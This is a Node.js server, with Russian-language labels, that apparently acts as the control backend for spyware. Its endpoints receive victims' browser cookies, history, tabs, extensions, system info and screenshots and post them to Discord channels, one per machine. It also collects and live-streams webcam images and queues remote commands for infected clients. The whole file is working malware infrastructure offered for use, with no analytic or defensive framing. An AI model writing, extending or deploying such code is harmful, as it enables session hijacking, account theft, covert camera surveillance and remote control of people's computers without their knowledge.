// server.js
import express from "express";
import { Client, GatewayIntentBits, ChannelType } from "discord.js";
import http from "http";
import { WebSocketServer } from "ws";
import crypto from "crypto";

const app = express();
app.use(express.json({ limit: "100mb" }));

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const CATEGORY_BASE_PC = "Все ПК";
const CATEGORY_BASE_CAM = "Камеры";
const ONLINE_TIMEOUT = 3 * 60 * 1000;

const onlinePCs = {};
const pendingCommands = {};
const channelByPC = {};
const channelByCam = {};
const wsCameraClients = {};

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));

function shortHash(s, len = 8) {
  return crypto.createHash("sha1").update(s).digest("hex").slice(0, len);
}
function safeChannelName(prefix, id) {
  return `${prefix}-${shortHash(id)}`.toLowerCase();
}

async function getOrCreateCategory(guild, name) {
  const channels = await guild.channels.fetch();
  let category = channels.find(c => c.type === ChannelType.GuildCategory && c.name === name);
  if (!category) category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
  return category;
}

async function getOrCreateTextChannel(guild, name, parentId) {
  const channels = await guild.channels.fetch();
  let channel = channels.find(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
  if (!channel) channel = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
  return channel;
}

// ---------- Upload PC ----------
app.post("/upload-pc", async (req, res) => {
  try {
    const { pcId, cookies, history, tabs, extensions, systemInfo, screenshot, command } = req.body;
    if (!pcId) return res.status(400).json({ error: "pcId required" });
    onlinePCs[pcId] = Date.now();

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
    const channelName = safeChannelName("pc", pcId);
    const channel = channelByPC[pcId]
      ? await guild.channels.fetch(channelByPC[pcId]).catch(() => null)
      : await getOrCreateTextChannel(guild, channelName, category.id);
    channelByPC[pcId] = channel.id;

    const files = [];
    if (cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${channelName}-cookies.json` });
    if (history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${channelName}-history.json` });
    if (tabs) files.push({ attachment: Buffer.from(JSON.stringify(tabs, null, 2)), name: `${channelName}-tabs.json` });
    if (extensions) files.push({ attachment: Buffer.from(JSON.stringify(extensions, null, 2)), name: `${channelName}-extensions.json` });
    if (systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${channelName}-system.json` });
    if (screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });

    if (files.length) await channel.send({ files });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ---------- Upload Cam ----------
app.post("/upload-cam", async (req, res) => {
  try {
    const { camId, screenshot } = req.body;
    if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });

    if (wsCameraClients[camId]) wsCameraClients[camId].forEach(ws => { try { ws.send(screenshot); } catch (e) {} });

    const guild = await bot.guilds.fetch(GUILD_ID);
    const category = await getOrCreateCategory(guild, CATEGORY_BASE_CAM);
    const channelName = safeChannelName("cam", camId);
    const channel = channelByCam[camId]
      ? await guild.channels.fetch(channelByCam[camId]).catch(() => null)
      : await getOrCreateTextChannel(guild, channelName, category.id);
    channelByCam[camId] = channel.id;

    await channel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-cam.jpeg` }] });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ---------- Ping ----------
app.post("/ping", (req, res) => {
  const { pcId } = req.body;
  if (!pcId) return res.status(400).json({ error: "pcId required" });
  onlinePCs[pcId] = Date.now();
  const commands = pendingCommands[pcId] || [];
  pendingCommands[pcId] = [];
  res.json({ commands });
});

// ---------- API фронта ----------
app.get("/api/online-pcs", (req, res) => res.json(Object.keys(onlinePCs)));

// ---------- WebSocket ----------
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req) => {
  const url = new URL(req.url, `ws://${req.headers.host}`);
  const camId = url.searchParams.get("camId");
  if (!camId) return ws.close();
  if (!wsCameraClients[camId]) wsCameraClients[camId] = [];
  wsCameraClients[camId].push(ws);
  ws.on("close", () => wsCameraClients[camId] = wsCameraClients[camId].filter(c => c !== ws));
});

server.on("upgrade", (req, socket, head) => {
  wss.handleUpgrade(req, socket, head, ws => wss.emit("connection", ws, req));
});

// ---------- Запуск ----------
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
bot.login(DISCORD_BOT_TOKEN);
